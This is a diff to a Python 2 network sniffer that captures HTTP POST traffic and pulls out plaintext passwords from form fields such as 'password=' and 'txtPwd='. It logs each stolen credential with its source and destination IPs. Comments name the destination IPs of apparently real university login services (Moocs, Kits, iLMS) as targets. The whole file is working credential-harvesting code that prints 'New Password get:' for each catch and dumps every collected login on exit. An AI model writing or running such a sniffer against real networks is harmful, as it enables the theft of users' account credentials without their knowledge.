@@ -3,6 +3,7 @@ import pcap
 import re
 import socket
 import urlparse
+from pprint import pprint
 
 APP_TO_PORT = {80: 'http'}
 
@@ -24,10 +25,6 @@ class Sniffer(object):
 
     def _is_host(self, content):
         regex = re.compile('Host: (.*)')
-        return content is not None and regex.search(content)
-
-    def _is_post_method(self, content):
-        regex = re.compile('POST (.*) ')
         return content is not None and regex.search(content)
 
     def _is_pwd(self, content):
@@ -76,10 +73,18 @@ class Sniffer(object):
         else:
             self.all_user_info[self.info_counter].update({'password': None})
 
-        print self.all_user_info
+        print "New Password get:"
+        pprint(self.all_user_info[self.info_counter])
 
     def _get_http_payload(self, ip_pkt, tcp_pkt):
-        tcp_pkt.data
+        try:
+            http_req = dpkt.http.Request(tcp_pkt.data)
+            if http_req.method == 'POST':
+                # This is POST method
+                pass
+        except dpkt.dpkt.UnpackError:
+            pass
+
         if 'POST' in tcp_pkt.data:
             # print 'POST', tcp.data
             if 'password=' in tcp_pkt.data:
@@ -93,24 +98,24 @@ class Sniffer(object):
                                     socket.inet_ntoa(ip_pkt.dst),
                                     tcp_pkt.dport)
 
-            elif 'password=' in tcp_pkt.data:
-                # print 'password', tcp.data
-                qs_d = urlparse.parse_qs(tcp_pkt.data)
-                # print qs_d
-                self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
-                                socket.inet_ntoa(ip_pkt.dst),
-                                tcp_pkt.dport)
+        elif 'password=' in tcp_pkt.data:
+            # print 'password', tcp.data
+            qs_d = urlparse.parse_qs(tcp_pkt.data)
+            # print qs_d
+            self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
+                            socket.inet_ntoa(ip_pkt.dst),
+                            tcp_pkt.dport)
 
-            elif 'txtPwd=' in tcp_pkt.data:
-                qs_d = urlparse.parse_qs(tcp_pkt.data)
-                self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
-                                socket.inet_ntoa(ip_pkt.dst),
-                                tcp_pkt.dport)
-            else:
-                pass
-            # Moocs dst IP 140.114.60.144
-            # Kits dst IP 74.125.204.121
-            # iLMS dst IP 140.114.69.137
+        elif 'txtPwd=' in tcp_pkt.data:
+            qs_d = urlparse.parse_qs(tcp_pkt.data)
+            self._pick_info(qs_d, socket.inet_ntoa(ip_pkt.src),
+                            socket.inet_ntoa(ip_pkt.dst),
+                            tcp_pkt.dport)
+        else:
+            return
+        # Moocs dst IP 140.114.60.144
+        # Kits dst IP 74.125.204.121
+        # iLMS dst IP 140.114.69.137
 
     def loop(self):
         while True:
@@ -119,14 +124,15 @@ class Sniffer(object):
                     eth = dpkt.ethernet.Ethernet(buf)
                     ip = eth.data
                     tcp = ip.data
-                    # print tcp.dport
-                    # print socket.inet_ntoa(ip.dst)
-                    self._get_http_payload(ip, tcp)
+                    if len(tcp.data) > 0:
+                        self._get_http_payload(ip, tcp)
 
             except KeyboardInterrupt:
                 nrecv, ndrop, nifdrop = self.pc.stats()
                 print '\n%d packets received by filter' % nrecv
                 print '%d packets dropped by kernel' % ndrop
+                print 'All user info: '
+                pprint(self.all_user_info)
                 break
             except (NameError, TypeError):
                 # print "No packet"
